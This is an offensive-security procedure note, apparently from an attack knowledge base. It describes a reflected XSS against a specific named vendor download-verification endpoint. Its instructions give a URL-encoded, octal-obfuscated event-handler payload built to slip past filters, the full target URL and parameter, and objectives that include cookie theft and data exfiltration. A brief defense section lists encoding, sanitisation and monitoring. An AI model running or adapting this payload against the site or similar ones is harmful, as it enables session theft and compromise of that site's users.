---
id: proc-uuid-005
tags:
  - xss
  - payload-injection
  - execution
type: procedure
tools:
  - '[[tools/Browser]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.610Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Trigger-XSS-Payload

## Summary

This procedure injects the octal-encoded JavaScript payload into the serial parameter, URL-encodes it, and triggers execution via browser events to achieve reflected XSS.

## Description

Embed the crafted payload in an HTML context like <h1 onmouseover=...>test</h1>, URL-encode for transmission, and load the full URL. Upon rendering or event trigger (e.g., onmouseover, onerror), the JS executes in the victim's browser, enabling impacts like cookie theft. Builds on prior payload crafting.

## Requirements

1. Validated octal payload from previous procedure
2. URL encoding tool or browser
3. Target endpoint access

## Defense

Defensive measures and detection strategies:

- Encode all reflected outputs as HTML-safe
- Validate and sanitize against encoded payloads
- Monitor for JS execution anomalies in browser logs

## Objectives

1. Deliver payload without detection by filter
2. Trigger arbitrary JS in victim context
3. Demonstrate impacts like alert or data exfil

## Instructions

### Step 1: Encode and Append Payload

**Context**: Prepare the injection string with event handler.

Construct: <h1 onmouseover=[encoded JS]>test</h1>

URL-encode: serial=%3Ch1+onmouseover=%5B%5D%5B%22\146\151\154\164\145\162%22%5D%5B%22\143\157\156\163\164\162\165\143\164\157\162%22%5D(%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

### Step 2: Load and Trigger

**Context**: Navigate to trigger execution.

Use [[tools/Browser]] to load:

```url
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=<encoded payload>
```

> Hover over the element or wait for load; expect JS to execute, e.g., alert(document.domain).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Browser]]

## Tags

- [[xss]]
- [[payload-injection]]
- [[Execution]]
